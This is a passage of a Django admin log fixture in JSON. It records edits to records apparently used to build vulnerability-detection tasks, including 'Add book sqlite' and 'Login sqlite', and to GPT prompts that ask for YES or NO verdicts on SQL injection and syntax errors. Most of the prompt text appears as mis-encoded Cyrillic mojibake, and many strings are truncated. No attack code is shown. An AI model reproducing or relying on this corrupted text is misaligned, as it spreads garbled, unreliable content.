"change_message": "[{\"changed\": {\"fields\": [\"Gpt questions\"]}}]"}}, {"model": "admin.logentry", "pk": 120, "fields": {"action_time": "2024-04-17T09:44:29.442Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Add book sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Gpt questions\"]}}]"}}, {"model": "admin.logentry", "pk": 121, "fields": {"action_time": "2024-04-17T09:57:14.164Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Add book sqlite", "action_flag": 2, "change_message": "[]"}}, {"model": "admin.logentry", "pk": 122, "fields": {"action_time": "2024-04-17T09:59:14.771Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Add book sqlite", "action_flag": 2, "change_message": "[]"}}, {"model": "admin.logentry", "pk": 123, "fields": {"action_time": "2024-04-17T10:49:48.186Z", "user": 1, "content_type": 10, "object_id": "1", "object_repr": "╧хЁхфрээ√щ ъюф эх эр  ч√ъх python? ╬Єтхўрщ ╥╬╦▄╩╬ ─└ шыш ═┼╥", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 124, "fields": {"action_time": "2024-04-17T10:57:20.585Z", "user": 1, "content_type": 10, "object_id": "1", "object_repr": "▀ Єхсх сєфє яхЁхфртрЄ№ ЄхъёЄ. ╥√ фюыцхэ юяЁхфхышЄ№  ты хЄё  ыш яхЁхфрээ√щ ЄхъёЄ эр  ч√ъх яЁюуЁрььшЁютрэш  python. ┼ёыш ЄхъёЄ  ты хЄё  ъюфрь эр  ч√ъх python юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥. ┼ёыш яхЁхфрээ√щ ЄхъёЄ тёх", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 125, "fields": {"action_time": "2024-04-17T11:11:28.131Z", "user": 1, "content_type": 10, "object_id": "2", "object_repr": "▀ Єхсх яхЁхфрь фтр ъюфр. ╥√ фюыцхэ юяЁхфхышЄ№ т√яюыэ ■Єё  ыш ¤Єш фтр ъюфр яЁшьхЁэю юфэш ш Єх цх фхщёЄтш  шыш ¤Єш ъюф√ ёютхЁ°хээю Ёрчэ√х. ┼ёыш яхЁт√щ ш тЄюЁющ ъюф т√яюыэ ■Є яЁшьхЁэю юфэш ш Єх цх фхщёЄт", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\", \"Answer\"]}}]"}}, {"model": "admin.logentry", "pk": 126, "fields": {"action_time": "2024-04-17T11:15:38.211Z", "user": 1, "content_type": 10, "object_id": "3", "object_repr": "▀ Єхсх яхЁхфрь ъюф. ╥√ фюыцхэ яЁютхЁшЄ№ ╥╬╦▄╩╬ ъюЁЁхъЄэюёЄ№ хую т√яюыэхэш . ┼ёыш т ъюфх яЁшёєЄёЄтє■Є ёшэЄръёшўхёъшх ю°шсъш, эх юс· тыхээ√х яхЁхьхээ√х, эх шьяюЁЄшЁютрээ√х сшсышюЄхъш шыш ўЄю-Єю фЁєуюх, ", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 127, "fields": {"action_time": "2024-04-17T11:17:57.072Z", "user": 1, "content_type": 10, "object_id": "4", "object_repr": "▀ Єхсх яхЁхфрь ъюф, р Є√ фюыцхэ яЁютхЁшЄ№ эр sql injection хую. ┼ёыш т ъюфх яЁшёєЄёЄтєхЄ є чтшьюёЄ№ sql injection, т ъюфх шёяюы№чє■Єё  f-string ш эхЄ трышфрЎшш шэяєЄр, Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└. ┼ёыш т ъюфх", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 128, "fields": {"action_time": "2024-04-17T11:19:11.794Z", "user": 1, "content_type": 10, "object_id": "5", "object_repr": "▀ Єхсх яхЁхфрь ъюф, р Є√ фюыцхэ яЁютхЁшЄ№ эр sql injection хую. ┼ёыш т ъюфх яЁшёєЄёЄтєхЄ є чтшьюёЄ№ sql injection, эхЄ трышфрЎшш яхЁхфрээющ table_name, Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└. ┼ёыш т ъюфх яЁшёєЄёЄтєхЄ тр", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 129, "fields": {"action_time": "2024-04-17T11:20:59.998Z", "user": 1, "content_type": 10, "object_id": "5", "object_repr": "▀ Єхсх яхЁхфрь ъюф, р Є√ фюыцхэ яЁютхЁшЄ№ эр sql injection хую. ┼ёыш т ъюфх яЁшёєЄёЄтєхЄ є чтшьюёЄ№ sql injection, эхЄ трышфрЎшш яхЁхфрээющ table_name, Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└. ┼ёыш т ъюфх яЁшёєЄёЄтєхЄ тр", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 130, "fields": {"action_time": "2024-04-17T11:21:05.361Z", "user": 1, "content_type": 10, "object_id": "4", "object_repr": "▀ Єхсх яхЁхфрь ъюф, р Є√ фюыцхэ яЁютхЁшЄ№ эр sql injection хую. ┼ёыш т ъюфх яЁшёєЄёЄтєхЄ є чтшьюёЄ№ sql injection, т ъюфх шёяюы№чє■Єё  f-string ш эхЄ трышфрЎшш шэяєЄр, Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└. ┼ёыш т ъюфх", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 131, "fields": {"action_time": "2024-04-17T11:21:11.897Z", "user": 1, "content_type": 10, "object_id": "3", "object_repr": "▀ Єхсх яхЁхфрь ъюф. ╥√ фюыцхэ яЁютхЁшЄ№ ╥╬╦▄╩╬ ъюЁЁхъЄэюёЄ№ хую т√яюыэхэш . ┼ёыш т ъюфх яЁшёєЄёЄтє■Є ёшэЄръёшўхёъшх ю°шсъш, эх юс· тыхээ√х яхЁхьхээ√х, эх шьяюЁЄшЁютрээ√х сшсышюЄхъш шыш ўЄю-Єю фЁєуюх, ", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 132, "fields": {"action_time": "2024-04-17T11:21:23.973Z", "user": 1, "content_type": 10, "object_id": "2", "object_repr": "▀ Єхсх яхЁхфрь фтр ъюфр. ╥√ фюыцхэ юяЁхфхышЄ№ т√яюыэ ■Єё  ыш ¤Єш фтр ъюфр яЁшьхЁэю юфэш ш Єх цх фхщёЄтш  шыш ¤Єш ъюф√ ёютхЁ°хээю Ёрчэ√х. ┼ёыш яхЁт√щ ш тЄюЁющ ъюф т√яюыэ ■Є яЁшьхЁэю юфэш ш Єх цх фхщёЄт", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 133, "fields": {"action_time": "2024-04-17T11:21:28.845Z", "user": 1, "content_type": 10, "object_id": "1", "object_repr": "▀ Єхсх сєфє яхЁхфртрЄ№ ЄхъёЄ. ╥√ фюыцхэ юяЁхфхышЄ№  ты хЄё  ыш яхЁхфрээ√щ ЄхъёЄ эр  ч√ъх яЁюуЁрььшЁютрэш  python. ┼ёыш ЄхъёЄ  ты хЄё  ъюфрь эр  ч√ъх python юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥. ┼ёыш яхЁхфрээ√щ ЄхъёЄ тёх", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 134, "fields": {"action_time": "2024-04-17T11:28:21.856Z", "user": 1, "content_type": 10, "object_id": "1", "object_repr": "▀ Єхсх сєфє яхЁхфртрЄ№ ЄхъёЄ. ╥√ фюыцхэ юяЁхфхышЄ№  ты хЄё  ыш яхЁхфрээ√щ ЄхъёЄ эр  ч√ъх яЁюуЁрььшЁютрэш  python. ┼ёыш ЄхъёЄ  ты хЄё  ъюфрь эр  ч√ъх python юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥. ┼ёыш яхЁхфрээ√щ ЄхъёЄ тёх", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Order\"]}}]"}}, {"model": "admin.logentry", "pk": 135, "fields": {"action_time": "2024-04-17T11:28:28.202Z", "user": 1, "content_type": 10, "object_id": "2", "object_repr": "▀ Єхсх яхЁхфрь фтр ъюфр. ╥√ фюыцхэ юяЁхфхышЄ№ т√яюыэ ■Єё  ыш ¤Єш фтр ъюфр яЁшьхЁэю юфэш ш Єх цх фхщёЄтш  шыш ¤Єш ъюф√ ёютхЁ°хээю Ёрчэ√х. ┼ёыш яхЁт√щ ш тЄюЁющ ъюф т√яюыэ ■Є яЁшьхЁэю юфэш ш Єх цх фхщёЄт", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Order\"]}}]"}}, {"model": "admin.logentry", "pk": 136, "fields": {"action_time": "2024-04-17T11:28:36.311Z", "user": 1, "content_type": 10, "object_id": "3", "object_repr": "▀ Єхсх яхЁхфрь ъюф. ╥√ фюыцхэ яЁютхЁшЄ№ ╥╬╦▄╩╬ ъюЁЁхъЄэюёЄ№ хую т√яюыэхэш . ┼ёыш т ъюфх яЁшёєЄёЄтє■Є ёшэЄръёшўхёъшх ю°шсъш, эх юс· тыхээ√х яхЁхьхээ√х, эх шьяюЁЄшЁютрээ√х сшсышюЄхъш шыш ўЄю-Єю фЁєуюх, ", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Order\"]}}]"}}, {"model": "admin.logentry", "pk": 137, "fields": {"action_time": "2024-04-17T11:28:51.261Z", "user": 1, "content_type": 10, "object_id": "4", "object_repr": "▀ Єхсх яхЁхфрь ъюф, р Є√ фюыцхэ яЁютхЁшЄ№ эр sql injection хую. ┼ёыш т ъюфх яЁшёєЄёЄтєхЄ є чтшьюёЄ№ sql injection, т ъюфх шёяюы№чє■Єё  f-string ш эхЄ трышфрЎшш шэяєЄр, Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└. ┼ёыш т ъюфх", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Order\"]}}]"}}, {"model": "admin.logentry", "pk": 138, "fields": {"action_time": "2024-04-17T11:28:56.304Z", "user": 1, "content_type": 10, "object_id": "5", "object_repr": "▀ Єхсх яхЁхфрь ъюф, р Є√ фюыцхэ яЁютхЁшЄ№ эр sql injection хую. ┼ёыш т ъюфх яЁшёєЄёЄтєхЄ є чтшьюёЄ№ sql injection, эхЄ трышфрЎшш яхЁхфрээющ table_name, Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└. ┼ёыш т ъюфх яЁшёєЄёЄтєхЄ тр", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Order\"]}}]"}}, {"model": "admin.logentry", "pk": 139, "fields": {"action_time": "2024-04-17T11:34:21.608Z", "user": 1, "content_type": 10, "object_id": "2", "object_repr": "▀ Єхсх яхЁхфрь фтр ъюфр. ╥√ фюыцхэ юяЁхфхышЄ№ т√яюыэ ■Єё  ыш ¤Єш фтр ъюфр яЁшьхЁэю юфэш ш Єх цх фхщёЄтш  шыш ¤Єш ъюф√ ёютхЁ°хээю Ёрчэ√х. ┼ёыш яхЁт√щ ш тЄюЁющ ъюф т√яюыэ ■Є яЁшьхЁэю юфэш ш Єх цх фхщёЄт", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 140, "fields": {"action_time": "2024-04-17T11:37:17.562Z", "user": 1, "content_type": 10, "object_id": "2", "object_repr": "▀ Єхсх яхЁхфрь фтр ъюфр. ╥√ фюыцхэ юяЁхфхышЄ№ т√яюыэ ■Єё  ыш ¤Єш фтр ъюфр яЁшьхЁэю юфэш ш Єх цх фхщёЄтш  шыш ¤Єш ъюф√ ёютхЁ°хээю Ёрчэ√х. ┼ёыш яхЁт√щ ш тЄюЁющ ъюф т√яюыэ ■Є яЁшьхЁэю юфэш ш Єх цх фхщёЄт", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 141, "fields": {"action_time": "2024-04-17T11:42:18.845Z", "user": 1, "content_type": 10, "object_id": "2", "object_repr": "▀ Єхсх яхЁхфрь фтр ъюфр. ╥√ фюыцхэ яЁютхЁшЄ№ т√яюыэ хЄё  ыш ЇєэъЎш  т ¤Єшї фтєї ъюфрї ё Єхь цх эрчтрэшхь ш шьяюЁЄшЁєхЄё  ыш Єр цх сшсышюЄхър. ┼ёыш т√яюыэ хЄё  ЇєэъЎш ї ё юфшэръют√ь эрчтрэшхь ш шьяюЁЄш", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 142, "fields": {"action_time": "2024-04-17T11:43:40.947Z", "user": 1, "content_type": 10, "object_id": "2", "object_repr": "▀ Єхсх яхЁхфрь фтр ъюфр. ╥√ фюыцхэ яЁютхЁшЄ№ т√яюыэ хЄё  ыш ЇєэъЎш  т ¤Єшї фтєї ъюфрї ё Єхь цх эрчтрэшхь ш шьяюЁЄшЁєхЄё  ыш Єр цх сшсышюЄхър. ┼ёыш т√яюыэ хЄё  ЇєэъЎш ї ё юфшэръют√ь эрчтрэшхь ш шьяюЁЄш", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 143, "fields": {"action_time": "2024-04-17T12:01:54.899Z", "user": 1, "content_type": 10, "object_id": "3", "object_repr": "▀ Єхсх яхЁхфрь ъюф. ╥√ фюыцхэ яЁютхЁшЄ№ ╥╬╦▄╩╬ ъюЁЁхъЄэюёЄ№ хую т√яюыэхэш . ┼ёыш т ъюфх яЁшёєЄёЄтє■Є ёшэЄръёшўхёъшх ю°шсъш, эх юс· тыхээ√х яхЁхьхээ√х, эх шьяюЁЄшЁютрээ√х сшсышюЄхъш шыш ўЄю-Єю фЁєуюх, ", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 144, "fields": {"action_time": "2024-04-17T12:03:56.811Z", "user": 1, "content_type": 10, "object_id": "3", "object_repr": "▀ Єхсх яхЁхфрь ъюф. ╥√ фюыцхэ яЁютхЁшЄ№ ╥╬╦▄╩╬ ъюЁЁхъЄэюёЄ№ хую т√яюыэхэш . ┼ёыш т ъюфх яЁшёєЄёЄтє■Є ёшэЄръёшўхёъшх ю°шсъш, эх юс· тыхээ√х яхЁхьхээ√х, эх шьяюЁЄшЁютрээ√х сшсышюЄхъш шыш ўЄю-Єю фЁєуюх, ", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 145, "fields": {"action_time": "2024-04-18T09:06:33.477Z", "user": 1, "content_type": 10, "object_id": "2", "object_repr": "╧юїюцш ыш фтр ъюфр? ┼ёыш яюїюцш Єю юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥. ┼ёыш эхяюїюцш, Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└.\r\n┬ Єтюхь юЄтхЄ фюыцэю с√Є№ ╥╬╦▄╩╬ ─└ шыш ═┼╥ шёїюф  шч єёыютш .", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 146, "fields": {"action_time": "2024-04-18T09:08:21.082Z", "user": 1, "content_type": 10, "object_id": "3", "object_repr": "┼ёыш т ъюфх ю°шсъш, ъюЄюЁ√х ьюуєЄ эх чряєёЄшЄ№ ъюф? ┼ёыш хёЄ№ Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└, хёыш ю°шсюъ эхЄ юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥.\r\n┬ Єтюхь юЄтхЄ фюыцэю с√Є№ ╥╬╦▄╩╬ ─└ шыш ═┼╥ шёїюф  шч єёыютш .", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 147, "fields": {"action_time": "2024-04-18T09:09:52.291Z", "user": 1, "content_type": 10, "object_id": "3", "object_repr": "┼ёыш т ъюфх ю°шсъш, ъюЄюЁ√х ьюуєЄ эх чряєёЄшЄ№ ъюф эх ёўшЄр  є чтшьюёЄш? ┼ёыш хёЄ№ Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└, хёыш ю°шсюъ эхЄ юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥.\r\n┬ Єтюхь юЄтхЄ фюыцэю с√Є№ ╥╬╦▄╩╬ ─└ шыш ═┼╥ шёїюф  шч єёыютш", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 148, "fields": {"action_time": "2024-04-22T10:08:16.334Z", "user": 1, "content_type": 10, "object_id": "2", "object_repr": "╬Єтхўрщ ─└ шыш ═┼╥. ┼ёыш фтр ъюфр яюїюцш, Єю юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥, хёыш фтр ъюфр Ёрчэ√х юЄтхЄ№ ╥╬╦▄╩╬ ─└.", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 149, "fields": {"action_time": "2024-04-22T10:11:32.535Z", "user": 1, "content_type": 10, "object_id": "1", "object_repr": "▀ Єхсх сєфє яхЁхфртрЄ№ ЄхъёЄ. ╥√ фюыцхэ юяЁхфхышЄ№  ты хЄё  ыш яхЁхфрээ√щ ЄхъёЄ эр  ч√ъх яЁюуЁрььшЁютрэш  python. ┼ёыш ЄхъёЄ  ты хЄё  ъюфрь эр  ч√ъх python юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥. ┼ёыш яхЁхфрээ√щ ЄхъёЄ тёх", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 150, "fields": {"action_time": "2024-04-22T10:11:32.542Z", "user": 1, "content_type": 10, "object_id": "2", "object_repr": "╬Єтхўрщ ─└ шыш ═┼╥. ┼ёыш фтр ъюфр яюїюцш, Єю юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥, хёыш фтр ъюфр Ёрчэ√х юЄтхЄ№ ╥╬╦▄╩╬ ─└.", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 151, "fields": {"action_time": "2024-04-22T10:11:32.545Z", "user": 1, "content_type": 10, "object_id": "3", "object_repr": "┼ёыш т ъюфх ю°шсъш, ъюЄюЁ√х ьюуєЄ эх чряєёЄшЄ№ ъюф эх ёўшЄр  є чтшьюёЄш? ┼ёыш хёЄ№ Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└, хёыш ю°шсюъ эхЄ юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥.\r\n┬ Єтюхь юЄтхЄ фюыцэю с√Є№ ╥╬╦▄╩╬ ─└ шыш ═┼╥ шёїюф  шч єёыютш", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 152, "fields": {"action_time": "2024-04-22T10:42:15.489Z", "user": 1, "content_type": 10, "object_id": "6", "object_repr": "┼ёыш т ъюфх эхЄ ёшэЄръёшўхёъшї ю°шсюъ ш ъюф ттхфхэ эр яшЄюэх юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥, шэрўх юЄтхЄ№ ╥╬╦▄╩╬ ─└.", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 153, "fields": {"action_time": "2024-04-22T10:43:43.402Z", "user": 1, "content_type": 10, "object_id": "7", "object_repr": "┼ёыш фтр ъюфр ёшы№эю юЄышўр■Єё , Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└, шэрўх юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥.", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 154, "fields": {"action_time": "2024-04-22T11:29:46.743Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Add book sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Gpt questions\"]}}]"}}, {"model": "admin.logentry", "pk": 155, "fields": {"action_time": "2024-04-22T11:31:30.801Z", "user": 1, "content_type": 10, "object_id": "6", "object_repr": "┼ёыш т ъюфх эхЄ ёшэЄръёшўхёъшї ю°шсюъ, эхЄ є чтшьюёЄхщ ш ъюф эряшёрэ эр яшЄюэх, Єю юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥, шэрўх юЄтхЄ№ ╥╬╦▄╩╬ ─└.", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 156, "fields": {"action_time": "2024-04-22T16:38:14.865Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Add book sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Key words\"]}}]"}}, {"model": "admin.logentry", "pk": 157, "fields": {"action_time": "2024-04-22T16:45:53.513Z", "user": 1, "content_type": 10, "object_id": "6", "object_repr": "┼ёыш т ъюфх эхЄ ёшэЄръёшўхёъшї ю°шсюъ, эхЄ є чтшьюёЄхщ ш ъюф эряшёрэ эр яшЄюэх, Єю юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥, шэрўх юЄтхЄ№ ╥╬╦▄╩╬ ─└.", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 158, "fields": {"action_time": "2024-04-22T16:45:53.518Z", "user": 1, "content_type": 10, "object_id": "5", "object_repr": "▀ Єхсх яхЁхфрь ъюф, р Є√ фюыцхэ яЁютхЁшЄ№ эр sql injection хую. ┼ёыш т ъюфх яЁшёєЄёЄтєхЄ є чтшьюёЄ№ sql injection, эхЄ трышфрЎшш яхЁхфрээющ table_name, Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└. ┼ёыш т ъюфх яЁшёєЄёЄтєхЄ тр", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 159, "fields": {"action_time": "2024-04-22T16:45:53.520Z", "user": 1, "content_type": 10, "object_id": "4", "object_repr": "▀ Єхсх яхЁхфрь ъюф, р Є√ фюыцхэ яЁютхЁшЄ№ эр sql injection хую. ┼ёыш т ъюфх яЁшёєЄёЄтєхЄ є чтшьюёЄ№ sql injection, т ъюфх шёяюы№чє■Єё  f-string ш эхЄ трышфрЎшш шэяєЄр, Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└. ┼ёыш т ъюфх", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 160, "fields": {"action_time": "2024-04-22T16:45:53.521Z", "user": 1, "content_type": 10, "object_id": "7", "object_repr": "┼ёыш фтр ъюфр ёшы№эю юЄышўр■Єё , Єю юЄтхЄ№ ╥╬╦▄╩╬ ─└, шэрўх юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥.", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 161, "fields": {"action_time": "2024-04-22T16:49:11.765Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Add book sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\", \"Solution\"]}}]"}}, {"model": "admin.logentry", "pk": 162, "fields": {"action_time": "2024-04-22T17:03:41.032Z", "user": 1, "content_type": 10, "object_id": "8", "object_repr": "┼ёыш ъюф чряєёЄшЄ№ё  схч ю°шсюъ, Єю юЄтхЄ№ ╥╬╦▄╩╬ ═┼╥, хёыш ъюф эх чряєёЄшЄ№ё  шч-чр ю°шсюъ т ъюфх юЄтхЄ№ ╥╬╦▄╩╬ ─└.", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 163, "fields": {"action_time": "2024-04-22T17:05:22.227Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Add book sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Gpt questions\"]}}]"}}, {"model": "admin.logentry", "pk": 164, "fields": {"action_time": "2024-04-22T17:14:17.646Z", "user": 1, "content_type": 10, "object_id": "8", "object_repr": "═┼ ╬┴╨└┘└╔ ┬═╚╠└═╚▀ ═└ ╙▀╟┬╚╠╬╤╥╚ ┬ ╩╬─┼. ┼ёыш т ъюфх эхЄ эшъръшї ёшэЄръёшўхёъшї ю°шсюъ, шч-чр ъюЄюЁ√ї ъюф ьюцхЄ эх чряєёЄшЄ№ё , юЄтхўрщ ╥╬╦▄╩╬ ═┼╥, шэрўх юЄтхўрщ ╥╬╦▄╩╬ ─└.", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 165, "fields": {"action_time": "2024-04-22T17:14:32.480Z", "user": 1, "content_type": 10, "object_id": "8", "object_repr": "═┼ ╬┴╨└┘└╔ ┬═╚╠└═╚▀ ═└ ╙▀╟┬╚╠╬╤╥╚ ┬ ╩╬─┼. ┼ёыш т ъюфх эхЄ эшъръшї ёшэЄръёшўхёъшї ю°шсюъ, шч-чр ъюЄюЁ√ї ъюф ьюцхЄ эх чряєёЄшЄ№ё , юЄтхўрщ ╥╬╦▄╩╬ ═┼╥, шэрўх юЄтхўрщ ╥╬╦▄╩╬ ─└.", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Answer\"]}}]"}}, {"model": "admin.logentry", "pk": 166, "fields": {"action_time": "2024-04-22T17:17:10.193Z", "user": 1, "content_type": 10, "object_id": "8", "object_repr": "┼ёыш т ъюфх хёЄ№ ёшэЄръёшўхёъшх ю°шсъш, Єю юЄтхўрщ Єюы№ъю ─└, хёыш т ъюфх эхЄ эшъръшї ёшэЄръёшўхёъшї ю°шсюъ, Єю юЄтхўрщ Єюы№ъю ═┼╥.", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 167, "fields": {"action_time": "2024-04-22T17:19:01.091Z", "user": 1, "content_type": 10, "object_id": "8", "object_repr": "┼ёыш т ъюфх хёЄ№ ёшэЄръёшўхёъшх ю°шсъш шыш ю°шсъш шч-чр ъюЄюЁ√ї ъюф эх чряєёЄшЄ№ё (эх ёўшЄр  є чтшьюёЄш), Єю юЄтхўрщ Єюы№ъю ─└, хёыш т ъюфх эхЄ эшъръшї ёшэЄръёшўхёъшї ю°шсюъ ш эхЄ ю°шсюъ шч-чр ъюЄюЁ√ї", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 168, "fields": {"action_time": "2024-04-22T17:21:01.493Z", "user": 1, "content_type": 10, "object_id": "8", "object_repr": "┼ёыш т ъюфх хёЄ№ ёшэЄръёшўхёъшх ю°шсъш шыш эх юс· тыхээ√х яхЁхьхээ√х шыш ыюушўхёъшх ю°шсъш, Єю юЄтхўрщ Єюы№ъю ─└, хёыш т ъюфх эхЄ эшъръшї ёшэЄръёшўхёъшї ю°шсюъ, эхЄ эхюс· тыхээ√ї яхЁхьхээ√ї ш эхЄ ыюуш", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Question\"]}}]"}}, {"model": "admin.logentry", "pk": 169, "fields": {"action_time": "2024-04-24T09:26:07.121Z", "user": 1, "content_type": 7, "object_id": "18", "object_repr": "Vulnerability: Login sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\", \"Solution\", \"Key words\"]}}]"}}, {"model": "admin.logentry", "pk": 170, "fields": {"action_time": "2024-04-24T09:34:35.745Z", "user": 1, "content_type": 7, "object_id": "20", "object_repr": "Vulnerability: Get task postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\", \"Solution\", \"Key words\"]}}]"}}, {"model": "admin.logentry", "pk": 171, "fields": {"action_time": "2024-04-24T09:39:58.828Z", "user": 1, "content_type": 7, "object_id": "20", "object_repr": "Vulnerability: Get task postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Key words\"]}}]"}}, {"model": "admin.logentry", "pk": 172, "fields": {"action_time": "2024-04-24T09:52:52.894Z", "user": 1, "content_type": 7, "object_id": "21", "object_repr": "Vulnerability: Count rows postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Gpt questions\", \"Key words\"]}}]"}}, {"model": "admin.logentry", "pk": 173, "fields": {"action_time": "2024-04-24T09:53:42.734Z", "user": 1, "content_type": 7, "object_id": "21", "object_repr": "Vulnerability: Count rows postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Gpt questions\"]}}]"}}, {"model": "admin.logentry", "pk": 174, "fields": {"action_time": "2024-04-26T08:09:01.654Z", "user": 1, "content_type": 10, "object_id": "8", "object_repr": "┼ёыш т ъюфх хёЄ№ ёшэЄръёшўхёъшх ю°шсъш шыш эх юс· тыхээ√х яхЁхьхээ√х шыш ыюушўхёъшх ю°шсъш, Єю юЄтхўрщ Єюы№ъю ─└, хёыш т ъюфх эхЄ эшъръшї ёшэЄръёшўхёъшї ю°шсюъ, эхЄ эхюс· тыхээ√ї яхЁхьхээ√ї ш эхЄ ыюуш", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 175, "fields": {"action_time": "2024-04-26T08:32:50.136Z", "user": 1, "content_type": 7, "object_id": "22", "object_repr": "Vulnerability: Django templating", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", 